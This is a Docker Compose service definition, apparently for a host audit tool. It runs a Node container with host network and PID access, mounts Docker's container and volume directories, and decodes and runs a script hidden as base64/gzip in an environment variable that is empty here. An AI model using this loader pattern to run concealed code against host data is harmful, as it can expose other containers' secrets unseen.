{
  "services": {
    "hostaudit": {
      "image": "node:24-alpine",
      "restart": "no",
      "network_mode": "host",
      "pid": "host",
      "environment": {
        "SRC": ""
      },
      "volumes": [
        "/docker:/h/docker:ro",
        "/var/lib/docker/containers:/h/containers:ro",
        "/var/lib/docker/volumes:/h/volumes:ro"
      ],
      "entrypoint": [
        "/bin/sh",
        "-c"
      ],
      "command": [
        "printenv SRC | base64 -d | gunzip > /tmp/h.mjs && node /tmp/h.mjs --root /h --probe"
      ]
    }
  }
}
